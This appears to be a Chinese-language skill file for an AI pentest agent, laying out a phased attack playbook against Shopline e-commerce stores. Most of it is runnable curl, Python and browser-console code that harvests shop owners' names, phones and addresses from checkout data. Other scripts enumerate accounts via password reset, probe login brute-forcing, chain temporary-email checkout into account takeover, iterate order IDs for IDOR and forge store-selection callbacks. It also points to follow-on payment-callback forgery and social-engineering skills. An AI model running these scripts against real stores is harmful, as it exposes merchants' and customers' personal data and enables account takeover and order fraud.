---
name: 商燕飞·店线
category: platform-pentest
priority: P2
score: 6
metadata:
  tags:
    - shopline
    - saas
    - ecommerce
    - angularjs
    - config-data-leak
    - password-reset-enum
    - graphql
    - taiwan
    - checkout
    - idor
  version: "2.0"
  updated: "2026-09-04"
  author: 大爱仙尊
description: >-
  Shopline SaaS 电商店铺渗透测试。AngularJS + Rails 多租户架构，结账 payload
  泄露配送 config_data（店主姓名/手机/地址/合约号），密码重置邮箱枚举，
  登录无速率限制，Benchat API 匿名可读，ECMap 门市回调可注入。
  GraphQL/REST 双通道端点枚举，AngularJS 模板注入探测。
  
globs:
  - "*.json"
  - "*.html"
---

> **商燕飞**
> 商道无亲利字先，一城风雨一城钱。
> 燕飞南北皆为市，账本比剑更锋寒。

# Shopline SaaS 电商渗透

**前提**：目标在 `授权范围`。Shopline 平台域 (`shoplineapp.com` / `admin.shoplineapp.com`) 不扩。

---

## 关联 Skill & Playbook

| 方向 | 名称 | 说明 |
|------|------|------|
| 上游 | `apk-recon` | Shopline 有 Android App 时先提取 API 密钥 |
| 上游 | `cdn-origin-tracing` | CDN 回源到独立后端时溯源 |
| 平行 | `spa-backend-api-pentest` | AngularJS SPA 后端 API 深入测试 |
| 平行 | `graphql-pentest` | GraphQL Storefront API 越权/内省 |
| 平行 | `idor-testing` | 订单/用户 IDOR 验证 |
| 平行 | `cors-exploitation` | API CORS 回射利用 |
| 平行 | `open-redirect-chain` | returnUrl 重定向到钓鱼 |
| 平行 | `account-takeover-chain` | 结账建号→重置→ATO 完整链 |
| 下游 | `payment-callback-forgery` | 支付回调伪造 |
| 下游 | `autonomous-social-engagement` | 技术面穷尽转社工 |
| Playbook | `传承/店线·租云.md` | 本栈作业真源 |
| 探针 | `python3 炼蛊房/shopline_probe.py --base https://店 --case <案>` | L1 mainConfig |
| 分级 | `传承/春秋蝉·分案.md` | 定级 |

---

## 识别指纹

| 指纹 | 来源 | curl 验证 |
|------|------|-----------|
| `Powered by SHOPLINE` | 页脚 | `curl -s TARGET \| grep -i shopline` |
| `cdn.shoplineapp.com` | JS/CSS CDN | `curl -sI TARGET \| grep cdn.shopline` |
| `shoplineimg.com` | 图片 CDN | 页面源码搜 `shoplineimg` |
| `_shop_shopline_session_id_v3` | Cookie | `curl -sI TARGET \| grep -i set-cookie` |
| `window.mainConfig` 含 `merchantId` | 内嵌 JS | 见下方命令 |
| `cname.shoplineapp.com` | DNS CNAME | `dig +short TARGET CNAME` |
| `/admin` 302 → `admin.shoplineapp.com` | 后台跳转 | `curl -sI TARGET/admin` |
| AngularJS `ng-controller` 在结账页 | 前端框架 | `curl -s TARGET/checkout \| grep ng-controller` |
| `kingsman_v2` / `basket` plan | 主题/套餐 | mainConfig 提取 |

---

## 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| **L1** | mainConfig 泄露 merchantId + 公开邮箱 + API NilClass 错误 | 只看到 Shopline 首页 |
| **L1b** | 密码重置差异响应可枚举邮箱 / 登录无速率限制 | reCAPTCHA 已启用且不可绕 |
| **L2** | 结账 payload 回传 config_data 含店主真名/手机/地址/合约号 | 只拿到 delivery ID |
| **L2b** | Benchat 订阅配置匿名可读（LINE/FB 渠道参数）| benchat/channel 返回 null |
| **L2c** | GraphQL Storefront API 回传未授权数据（客户信息/内部配置）| 仅公开商品数据 |
| **L3** | 利用建号链 ATO（结账→重置→登录→IDOR 跨订单）| IDOR 被平台完全隔离 |

---

## 何时启用

- 目标 DNS CNAME 含 `shoplineapp.com` 或 `cname.shoplineapp.com`
- 页脚 `Powered by SHOPLINE`
- Cookie `_shop_shopline_session_id_v3`
- 前端 AngularJS + Rails API (`/api/merchants/`, `/api/orders/`)
- 用户提到 myshopline / shopline / 台湾电商

---

## 强制行为

1. **禁止攻击平台域**：`shoplineapp.com` / `admin.shoplineapp.com` / `cdn.shoplineapp.com` 是 Shopline 多租户基础设施，不在授权范围。
2. 先提取 `window.mainConfig`（含 merchantId / handle / plan / recaptcha key / 发票统编）。
3. 结账页必须进 AngularJS scope 抓 `getFormData()` — 配送方 `config_data` 通常含店主个人信息。
4. 密码重置先测差异响应（已注册 vs 未注册），确认有无 reCAPTCHA。
5. 登录 API 至少打 10 次确认有无速率限制 / 锁定。
6. 已下单后订单 IDOR 必须测（Shopline 平台级隔离通常有效，但需验证）。
7. 结账自动建号链（临时邮箱→checkout→password_reset→login）在 reCAPTCHA 关闭时可完整自动化。
8. **GraphQL Storefront API 必须探测**，不能只打 REST。

---

## Phase 0: 指纹确认与 mainConfig 提取

### 命令 0-1: 一键指纹确认

```bash
# 完整指纹确认：DNS + HTTP 头 + 页面关键词
TARGET="https://example.com"

echo "=== DNS CNAME ==="
dig +short $(echo $TARGET | sed 's|https*://||;s|/.*||') CNAME

echo "=== HTTP 头 ==="
curl -skI "$TARGET" 2>/dev/null | grep -iE 'set-cookie|server|x-powered|location'

echo "=== 页面指纹 ==="
curl -sk "$TARGET" 2>/dev/null | grep -ioE 'shopline|shoplineapp|ng-controller|mainConfig|kingsman'
```

### 命令 0-2: mainConfig JSON 提取

```bash
# 提取 mainConfig 完整 JSON（含 merchantId, plan, recaptchaSitekey, handle, tradevanUbn）
TARGET="https://example.com"

curl -sk "$TARGET" | python3 -c "
import sys, re, json
html = sys.stdin.read()
m = re.search(r'window\.mainConfig\s*=\s*(\{.*?\});', html, re.DOTALL)
if m:
    cfg = json.loads(m.group(1))
    print(json.dumps(cfg, indent=2, ensure_ascii=False))
    print(f'\\n--- KEY FIELDS ---')
    for k in ['merchantId','handle','plan','recaptchaSitekey','tradevanUbn','currency','locale']:
        if k in cfg:
            print(f'  {k}: {cfg[k]}')
else:
    print('mainConfig not found')
"
```

### 命令 0-3: AngularJS 版本与绑定检测

```bash
# 检测 AngularJS 版本（模板注入前提）
TARGET="https://example.com"

curl -sk "$TARGET/checkout" | python3 -c "
import sys, re
html = sys.stdin.read()
# AngularJS 版本
v = re.search(r'angular[.-]?(\d+\.\d+\.\d+)', html)
if v:
    print(f'AngularJS version: {v.group(1)}')
    major, minor, patch = map(int, v.group(1).split('.'))
    if major == 1 and minor < 6:
        print('⚠️  < 1.6 — sandbox escape possible (CVE-2020-7676 etc)')
# ng-controller 列表
ctrls = re.findall(r'ng-controller=[\"\\x27]([^\"\\x27]+)', html)
if ctrls:
    print(f'Controllers: {ctrls}')
# ng-model 绑定
models = re.findall(r'ng-model=[\"\\x27]([^\"\\x27]+)', html)
if models:
    print(f'Models (top 20): {models[:20]}')
# 模板注入快测标记
print('Template injection test: {{7*7}} → 在搜索/输入框测试')
"
```

---

## Phase 1: REST API 匿名端点枚举

### 命令 1-1: 批量 API 探测

```bash
# 批量测试 Shopline REST API 端点（需 merchantId）
TARGET="https://example.com"
MID="<merchantId>"

ENDPOINTS=(
  "GET /api/merchants/${MID}/products"
  "GET /api/merchants/${MID}/products?page=1&per_page=100"
  "GET /api/merchants/${MID}/cart"
  "GET /api/merchants/${MID}/categories"
  "GET /api/merchants/${MID}/pages"
  "GET /api/merchants/${MID}/delivery_options"
  "GET /api/merchants/${MID}/payment_methods"
  "GET /api/benchat/rules"
  "GET /api/benchat/channel"
  "GET /api/benchat/subscriptions"
  "GET /api/orders"
  "GET /api/users/current_user"
  "GET /api/merchants/${MID}/settings"
  "GET /api/merchants/${MID}/promotions"
  "GET /api/merchants/${MID}/coupons"
)

for ep in "${ENDPOINTS[@]}"; do
  METHOD=$(echo "$ep" | awk '{print $1}')
  PATH=$(echo "$ep" | awk '{print $2}')
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' -X "$METHOD" "${TARGET}${PATH}")
  SIZE=$(curl -sk -X "$METHOD" "${TARGET}${PATH}" | wc -c | tr -d ' ')
  echo "${CODE} ${SIZE}B ${METHOD} ${PATH}"
done
```

### 命令 1-2: Benchat 配置泄露提取

```bash
# Benchat 匿名配置读取（LINE/FB 渠道参数泄露）
TARGET="https://example.com"

for path in /api/benchat/rules /api/benchat/channel /api/benchat/subscriptions /api/benchat/config; do
  echo "=== ${path} ==="
  resp=$(curl -sk "${TARGET}${path}" \
    -H "Accept: application/json" \
    -H "X-Requested-With: XMLHttpRequest")
  echo "$resp" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    if d and d != [] and d is not None:
        print(json.dumps(d, indent=2, ensure_ascii=False))
        print('⚠️  DATA EXPOSED')
    else:
        print('(empty)')
except: print('(not json)')
"
done
```

---

## Phase 2: GraphQL Storefront API 枚举

### 命令 2-1: GraphQL 端点发现与内省

```bash
# Shopline GraphQL Storefront API 探测
TARGET="https://example.com"

# 常见 GraphQL 端点
for gql_path in /graphql /api/graphql /storefront/graphql /gql /api/v1/graphql; do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' \
    -X POST "${TARGET}${gql_path}" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}')
  if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
    echo "FOUND: ${gql_path} → HTTP ${CODE}"
  fi
done

# 内省查询（如有端点）
GQL_PATH="/graphql"  # 替换实际路径
curl -sk "${TARGET}${GQL_PATH}" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' \
  | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    if 'data' in d and '__schema' in d['data']:
        types = d['data']['__schema']['types']
        custom = [t for t in types if not t['name'].startswith('__')]
        for t in custom[:30]:
            fields = [f['name'] for f in (t.get('fields') or [])]
            print(f\"{t['name']}: {', '.join(fields[:10])}\")
        print(f'\\nTotal custom types: {len(custom)}')
    elif 'errors' in d:
        print(f'Introspection blocked: {d[\"errors\"][0].get(\"message\",\"\")}')
    else:
        print(json.dumps(d, indent=2)[:500])
except Exception as e:
    print(f'Parse error: {e}')
"
```

### 命令 2-2: GraphQL 商品/客户/订单泄露测试

```python
#!/usr/bin/env python3
"""Shopline GraphQL Storefront API 数据泄露测试"""
import requests, json, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
GQL = f"{TARGET}/graphql"
HEADERS = {"Content-Type": "application/json"}

QUERIES = {
    "products": '{ products(first: 5) { edges { node { id title handle variants { edges { node { id price sku } } } } } } }',
    "collections": '{ collections(first: 5) { edges { node { id title handle } } } }',
    "shop": '{ shop { name description primaryDomain { host } paymentSettings { supportedDigitalWallets currencyCode } } }',
    "customers_attempt": '{ customers(first: 1) { edges { node { id email phone firstName lastName } } } }',
    "orders_attempt": '{ orders(first: 1) { edges { node { id name email totalPriceV2 { amount currencyCode } } } } }',
    "pages": '{ pages(first: 10) { edges { node { id title handle body } } } }',
    "blogs": '{ blogs(first: 5) { edges { node { id title articles(first: 3) { edges { node { title content } } } } } } }',
}

for name, query in QUERIES.items():
    try:
        r = requests.post(GQL, headers=HEADERS, json={"query": query}, timeout=10, verify=False)
        d = r.json()
        if "data" in d and d["data"]:
            non_null = {k:v for k,v in d["data"].items() if v}
            if non_null:
                print(f"✅ {name}: {json.dumps(non_null, ensure_ascii=False)[:200]}")
            else:
                print(f"⬚ {name}: all null")
        elif "errors" in d:
            print(f"❌ {name}: {d['errors'][0].get('message','')[:100]}")
        else:
            print(f"? {name}: HTTP {r.status_code}")
    except Exception as e:
        print(f"💥 {name}: {e}")
```

---

## Phase 3: 结账 payload 配送 config_data 泄露

### 命令 3-1: 自动加购 + 提取配送选项

```python
#!/usr/bin/env python3
"""Shopline 结账配送 config_data 泄露提取（需至少一个商品在售）"""
import requests, json, sys, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
s = requests.Session()
s.verify = False

# 获取首页 + CSRF + merchantId
home = s.get(TARGET)
csrf = re.search(r'meta name="csrf-token" content="([^"]+)"', home.text)
mc = re.search(r'"merchantId"\s*:\s*"([^"]+)"', home.text)
if not csrf or not mc:
    print("无法提取 CSRF / merchantId"); sys.exit(1)
CSRF = csrf.group(1)
MID = mc.group(1)
print(f"merchantId: {MID}, CSRF: {CSRF[:20]}...")

HEADERS = {
    "X-CSRF-Token": CSRF,
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json",
    "Accept": "application/json",
}

# 获取商品列表，取第一个变体
prods = s.get(f"{TARGET}/api/merchants/{MID}/products?page=1&per_page=5", headers=HEADERS).json()
if not prods:
    print("无商品"); sys.exit(1)
first = prods[0] if isinstance(prods, list) else prods.get("items", prods.get("products", [{}]))[0]
vid = None
if "variations" in first:
    vid = first["variations"][0].get("id") or first["variations"][0].get("_id")
elif "variants" in first:
    vid = first["variants"][0].get("id") or first["variants"][0].get("_id")
pid = first.get("id") or first.get("_id")
print(f"Product: {first.get('title','?')}, pid={pid}, vid={vid}")

# 加入购物车
cart_add = s.post(f"{TARGET}/api/merchants/{MID}/cart/items", headers=HEADERS,
    json={"product_id": pid, "variation_id": vid, "quantity": 1})
print(f"Add to cart: {cart_add.status_code}")

# 获取购物车（含配送选项 + config_data）
cart = s.get(f"{TARGET}/api/merchants/{MID}/cart", headers=HEADERS).json()
print(json.dumps(cart, indent=2, ensure_ascii=False)[:500])

# 提取配送 config_data
def extract_config_data(obj, path=""):
    """递归搜索 config_data 字段"""
    if isinstance(obj, dict):
        if "config_data" in obj:
            print(f"\n⚠️  config_data FOUND at {path}:")
            print(json.dumps(obj["config_data"], indent=2, ensure_ascii=False))
        for k, v in obj.items():
            extract_config_data(v, f"{path}.{k}")
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            extract_config_data(v, f"{path}[{i}]")

extract_config_data(cart, "cart")

# 获取配送选项列表
delivery = s.get(f"{TARGET}/api/merchants/{MID}/delivery_options", headers=HEADERS)
if delivery.status_code == 200:
    print("\n=== delivery_options ===")
    extract_config_data(delivery.json(), "delivery_options")
```

### 命令 3-2: AngularJS Scope 注入提取（浏览器控制台）

```javascript
// 在 /checkout 页面 DevTools Console 执行
// 1. 枚举所有 AngularJS controller scope
document.querySelectorAll('[ng-controller]').forEach(el => {
  const scope = angular.element(el).scope();
  console.log('Controller:', el.getAttribute('ng-controller'));
  console.log('Scope keys:', Object.keys(scope).filter(k => !k.startsWith('$')));
});

// 2. 提取 getFormData() 完整 JSON
const checkoutScope = angular.element(
  document.querySelector('[ng-controller*="Checkout"]') ||
  document.querySelector('[ng-controller]')
).scope();
if (checkoutScope.getFormData) {
  const data = checkoutScope.getFormData();
  console.log('=== FORM DATA ===');
  console.log(JSON.stringify(data, null, 2));
}

// 3. 提取 delivery_options + config_data
if (checkoutScope.delivery_options) {
  checkoutScope.delivery_options.forEach(opt => {
    console.log(`Delivery: ${opt.name || opt.title}`);
    if (opt.config_data) {
      console.log('⚠️ config_data:', JSON.stringify(opt.config_data, null, 2));
    }
  });
}

// 4. 提取 payment_methods
if (checkoutScope.payment_methods) {
  checkoutScope.payment_methods.forEach(pm => {
    console.log(`Payment: ${pm.name}`, pm);
  });
}
```

### config_data 常见泄露字段

| 字段 | 含义 | 危害 |
|------|------|------|
| `sender_name` | 店主真名 | 身份信息泄露 |
| `sender_phone` | 店主手机 | PII 泄露 |
| `sender_address` | 寄件地址 | PII 泄露 |
| `contract_code` | 物流合约编号 | 商业机密 |
| `phone_number` | 7-11 C2C 手机 | PII |
| `shopid` / `parentid` | 超商店号 | 配送信息 |
| `api_key` / `api_secret` | 第三方物流密钥 | 接管物流 |

---

## Phase 4: 密码重置枚举与登录爆破

### 命令 4-1: 密码重置差异响应枚举

```python
#!/usr/bin/env python3
"""Shopline 密码重置邮箱枚举（差异响应检测）"""
import requests, re, sys, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
s = requests.Session()
s.verify = False

# 获取 CSRF
home = s.get(TARGET)
csrf = re.search(r'meta name="csrf-token" content="([^"]+)"', home.text)
CSRF = csrf.group(1) if csrf else ""

HEADERS = {
    "X-CSRF-Token": CSRF,
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded",
}

# 已知存在 vs 不存在的邮箱
test_emails = [
    "admin@example.com",           # 可能存在
    "test@example.com",
    "nonexist_xyzzy@example.com",  # 大概率不存在
    "aaaaaa@fake-domain-test.com", # 一定不存在
]

results = {}
for email in test_emails:
    r = s.post(f"{TARGET}/users/password/new",
        headers=HEADERS,
        data={"email": email, "utf8": "✓", "authenticity_token": CSRF})
    body_len = len(r.text)
    has_success = bool(re.search(r'(幾分鐘|sent|successfully|check your email)', r.text, re.I))
    results[email] = {"status": r.status_code, "len": body_len, "success_msg": has_success}
    print(f"{email}: HTTP {r.status_code}, len={body_len}, success={has_success}")
    time.sleep(1)

# 差异分析
lengths = set(v["len"] for v in results.values())
success_flags = set(v["success_msg"] for v in results.values())
if len(lengths) > 1 or len(success_flags) > 1:
    print("\n⚠️  差异响应存在 — 可枚举邮箱")
else:
    print("\n✅ 响应一致 — 枚举不可行")
```

### 命令 4-2: 登录速率限制检测

```bash
# 登录 API 速率限制检测（20 次快速尝试）
TARGET="https://example.com"

# 获取 CSRF
CSRF=$(curl -sk "$TARGET" | grep -oP 'csrf-token" content="\K[^"]+')

echo "Testing login rate limit (20 attempts)..."
for i in $(seq 1 20); do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' \
    -X POST "${TARGET}/api/users/sign_in" \
    -H "X-CSRF-Token: $CSRF" \
    -H "Content-Type: application/json" \
    -H "X-Requested-With: XMLHttpRequest" \
    -d "{\"email\":\"ratelimit_test_${i}@nonexist.com\",\"password\":\"wrongpass${i}\"}")
  echo "Attempt $i: HTTP $CODE"
  sleep 0.3
done
echo "If all return 401 without 429/captcha → NO rate limit"
```

---

## Phase 5: 结账自动建号 ATO 链

### 命令 5-1: 完整 ATO 链（结账→建号→重置→登录）

```python
#!/usr/bin/env python3
"""Shopline 结账自动建号 → 密码重置 → ATO 链（需临时邮箱）"""
import requests, re, sys, json, time

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
TEMP_EMAIL = sys.argv[2] if len(sys.argv) > 2 else None

if not TEMP_EMAIL:
    print("Usage: python3 shopline_ato.py <target> <temp_email>")
    print("Tips: 用 1secmail / guerrillamail / ooynib 临时邮箱")
    sys.exit(1)

s = requests.Session()
s.verify = False
home = s.get(TARGET)
csrf_m = re.search(r'meta name="csrf-token" content="([^"]+)"', home.text)
mc_m = re.search(r'"merchantId"\s*:\s*"([^"]+)"', home.text)
CSRF = csrf_m.group(1) if csrf_m else ""
MID = mc_m.group(1) if mc_m else ""

H = {
    "X-CSRF-Token": CSRF,
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json",
    "Accept": "application/json",
}

# Step 1: 获取商品加购
prods = s.get(f"{TARGET}/api/merchants/{MID}/products?page=1&per_page=1", headers=H).json()
if not prods:
    print("无商品可加购"); sys.exit(1)
prod = prods[0] if isinstance(prods, list) else list(prods.values())[0]
pid = prod.get("id") or prod.get("_id")
vid = None
for vk in ["variations","variants"]:
    if vk in prod and prod[vk]:
        vid = prod[vk][0].get("id") or prod[vk][0].get("_id")
        break

r = s.post(f"{TARGET}/api/merchants/{MID}/cart/items", headers=H,
    json={"product_id": pid, "variation_id": vid, "quantity": 1})
print(f"[1] Add to cart: {r.status_code}")

# Step 2: 结账填写临时邮箱（自动建号）
checkout_data = {
    "order": {
        "customer_email": TEMP_EMAIL,
        "customer_name": "Test User",
        "customer_phone": "+886900000000",
    }
}
r = s.put(f"{TARGET}/api/merchants/{MID}/cart", headers=H, json=checkout_data)
print(f"[2] Set checkout email: {r.status_code}")

# Step 3: 触发密码重置
time.sleep(2)
r = s.post(f"{TARGET}/users/password/new", headers={
    "X-CSRF-Token": CSRF,
    "Content-Type": "application/x-www-form-urlencoded",
}, data={"email": TEMP_EMAIL, "utf8": "✓", "authenticity_token": CSRF})
print(f"[3] Password reset: {r.status_code}")
has_sent = bool(re.search(r'(幾分鐘|sent|check your email)', r.text, re.I))
print(f"    Reset email sent: {has_sent}")

if has_sent:
    print(f"\n⚠️  ATO 链前半段成功：")
    print(f"    结账建号({TEMP_EMAIL}) → 密码重置已发送")
    print(f"    下一步: 从临时邮箱取重置链接 → 设密码 → 登录 → 订单 IDOR")
```

---

## Phase 6: IDOR / 越权测试

### 命令 6-1: 订单 IDOR 横向测试

```bash
# 需要先登录获得 session（用 Step 5 的账号）
TARGET="https://example.com"

# 当前用户信息
curl -sk "${TARGET}/api/users/current_user" \
  -H "Cookie: _shop_shopline_session_id_v3=<session>" \
  -H "Accept: application/json" | python3 -m json.tool

# 订单 IDOR: 遍历 order_id 格式（通常是 MongoDB ObjectId）
# 先拿自己的订单 ID 作为基准
MY_ORDER="<my_order_id>"

# 测试其他 order_id（微调最后几位）
for suffix in $(python3 -c "
oid = '$MY_ORDER'
base = int(oid, 16)
for delta in [-2, -1, 1, 2, 3, 5, 10]:
    print(format(base + delta, '024x'))
"); do
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' \
    "${TARGET}/api/orders/${suffix}" \
    -H "Cookie: _shop_shopline_session_id_v3=<session>" \
    -H "Accept: application/json")
  echo "order ${suffix}: HTTP ${CODE}"
done
```

---

## 7-11 ECMap 门市回调注入

Shopline 台湾站 7-11 C2C 配送使用外部 ECMap 选门市：
- ECMap URL: `emap.unipcsc.com.tw/ecmap/`
- 回调: POST 到 `{shop_url}/callback?isSameTab=true`

### 命令 7-1: 门市回调直接注入

```bash
# 绕过 UI 选门市，直接 POST 回调
TARGET="https://example.com"

curl -sk -X POST "${TARGET}/callback?isSameTab=true" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "storeid=993041&storename=%E6%9D%BE%E9%AB%98%E9%96%80%E5%B8%82&storeaddress=%E5%8F%B0%E5%8C%97%E5%B8%82%E4%BF%A1%E7%BE%A9%E5%8D%80%E5%9F%BA%E9%9A%86%E8%B7%AF%E4%B8%80%E6%AE%B5141%E8%99%9F1%E6%A8%93&outside=0&ship=1&TempVar="
```

---

## 已知局限

1. Shopline 是 SaaS 多租户 — 无自建源站，RCE / 云桶接管概率极低
2. IDOR 被平台级隔离，跨订单读通常失败
3. 结账可能触发商家级订单限制（限购/日限/手动关闭），非 IP 限速
4. `/admin` 跳转到平台域，管理后台不在授权范围
5. 前端 JS 均为平台公共 CDN，无自定义业务逻辑可审计
6. GraphQL Storefront API 权限随 Shopline 版本更新变化

---

## 经验教训（hecons.tw 案例）

1. **结账 422 不等于 IP 限速**：多代理测试均失败后确认是商家配置限制
2. **AngularJS scope 是金矿**：`getFormData()` 回传的 delivery_option 包含未做脱敏的 config_data
3. **intl-tel-input 默认国码坑**：台湾站可能默认 AU (+61)，需手动 setCountry
4. **ECMap 可直接 POST 回调**：不需要在 iframe 里点选门市
5. **临时邮箱 + 结账建号 = 完整 ATO 链前半段**
6. **GraphQL 不要忘**：Storefront API 可能泄露 REST 拿不到的数据

---

## 产出与落盘

```
案卷/<案卷>/
├── STATUS.md                    # 进度与结论
├── 案卷/
│   ├── mainConfig.json          # mainConfig 完整提取
│   ├── api_enum.txt             # REST API 枚举结果
│   ├── graphql_schema.json      # GraphQL 内省结果
│   └── fingerprint.txt          # 指纹确认记录
├── 接管/
│   ├── config_data_leak.json    # 配送 config_data 泄露证据
│   ├── benchat_leak.json        # Benchat 配置泄露
│   ├── email_enum.txt           # 邮箱枚举结果
│   ├── rate_limit_test.txt      # 速率限制测试记录
│   └── ato_chain.txt            # ATO 链执行记录
└── REPORT.md                    # 最终报告
```

## 真源

- 手法：`传承/店线·租云.md`
- 工具：`python3 炼蛊房/shopline_probe.py --base https://授权店 --case <案>`
- 分级：`传承/春秋蝉·分案.md`
